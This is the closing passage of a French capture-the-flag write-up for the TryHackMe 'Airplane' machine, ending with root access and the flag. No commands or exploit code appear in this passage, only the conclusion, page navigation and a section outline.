+</code></pre><p>Après avoir exécuté les deux commandes ci-dessus, nous obtenons l&rsquo;accès au compte root et nous pouvons lire le fichier <code>root.txt</code>.</p><p><img src=/images/THM-Airplane/root_flag.png alt="root flag"></p><p>Merci d&rsquo;avoir pris le temps de lire cet article, j&rsquo;espère qu&rsquo;il vous a été utile.</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/thm-thestickershop/>&#8592;
+Précédent:
+THM: The Sticker Shop</a></p><p class=prev-post-date>décembre 4, 2024</p></div><div class=next-post><p><a href=/fr/posts/htb-compiled/>Suivant:
+HTB: Compiled
+&#8594;</a></p><p class=next-post-date>décembre 13, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
+<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial-shell-en-tant-que-hudson>Accès initial (shell en tant que hudson)</a><ul><li><a href=#mouvement-latéral-shell-en-tant-que-carlos>Mouvement latéral (shell en tant que carlos)</a></li></ul></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
+<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>
